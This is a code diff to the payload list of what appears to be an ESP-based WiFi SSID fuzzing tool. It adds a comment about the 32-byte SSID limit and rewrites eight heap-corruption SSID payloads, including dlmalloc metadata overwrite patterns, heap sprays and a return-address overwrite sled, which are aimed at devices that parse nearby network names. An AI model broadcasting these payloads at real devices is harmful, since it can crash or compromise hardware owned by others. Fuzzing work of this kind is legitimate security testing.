@@ -63,7 +63,10 @@ DEFAULT_PAYLOADS = [
     # =========================================================================
     # WIFI SSID — Overflow / Fuzzing (26 payloads)
     # SSID max is 32 bytes per IEEE 802.11 — test parser boundary handling
-    # Includes 64-byte and 128-byte payloads targeting fixed-size buffers
+    # NOTE: WiFi.softAP() enforces the 32-byte limit. Payloads >32 bytes are
+    # truncated by the ESP WiFi driver. They are included for completeness and
+    # for use with raw frame injection (esp_wifi_80211_tx) in future firmware.
+    # The 32-byte payloads below are the ones actively broadcast as-is.
     # =========================================================================
 
     # --- 32-byte boundary (IEEE 802.11 SSID max) ---
@@ -196,16 +199,16 @@ DEFAULT_PAYLOADS = [
     # Byte patterns targeting heap/stack metadata in embedded allocators
     # Novel: not generic fuzzing — targets dlmalloc/newlib used by ESP
     # =========================================================================
-    ('\x41' * 4 + '\xff\xff\xff\xff' + '\x41' * 4 + '\xff\xff\xff\xff' + '\x41' * 4 + '\xff\xff\xff\xff' + '\x41' * 4 + '\xff\xff\xff\xff',
-                                     'wifi_heap',  'dlmalloc prev_size overwrite pattern'),
-    ('\x00\x00\x00\x04' * 8,        'wifi_heap',  'Fake chunk size=4 (minimum alloc)'),
-    ('\xef\xbe\xad\xde' * 8,        'wifi_heap',  '0xDEADBEEF canary detection probe'),
-    ('\x01\x00\x00\x00' * 8,        'wifi_heap',  'Integer 1 spray (bool true confusion)'),
-    ('\xff\xff\xff\x7f' * 8,        'wifi_heap',  'INT_MAX spray (integer overflow)'),
-    ('\x00' * 28 + '\x41\x41\x41\x41', 'wifi_heap', 'Null sled + return addr overwrite'),
-    ('\x0d\xf0\xad\xba' * 8,        'wifi_heap',  '0xBAADF00D uninitialized mem marker'),
-    ('\x41\x41\x41\x41' * 7 + '\xfe\xff\xfe\xff',
-                                     'wifi_heap',  'Heap spray + invalid free trigger'),
+    ('\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4,
+                                     'wifi_heap',  'dlmalloc prev_size overwrite pattern (32 bytes)'),
+    ('\x00\x00\x00\x04' * 8,        'wifi_heap',  'Fake chunk size=4 (32 bytes, minimum alloc)'),
+    ('DEADBEEF' * 4,                 'wifi_heap',  'DEADBEEF canary detection probe (32 bytes)'),
+    ('\x01\x00\x00\x00' * 8,        'wifi_heap',  'Integer 1 spray (32 bytes, bool confusion)'),
+    ('\x01\x01\x01\x7f' * 8,        'wifi_heap',  'Near-max byte spray (32 bytes, overflow probe)'),
+    ('\x00' * 28 + '\x41\x41\x41\x41', 'wifi_heap', 'Null sled + return addr overwrite (32 bytes)'),
+    ('BAADF00D' * 4,                 'wifi_heap',  'BAADF00D uninitialized mem marker (32 bytes)'),
+    ('\x41\x41\x41\x41' * 7 + '\x7e\x7f\x7e\x7f',
+                                     'wifi_heap',  'Heap spray + boundary trigger (32 bytes)'),
 
     # =========================================================================
     # WIFI SSID — XSS / Web UI Injection (8 payloads)
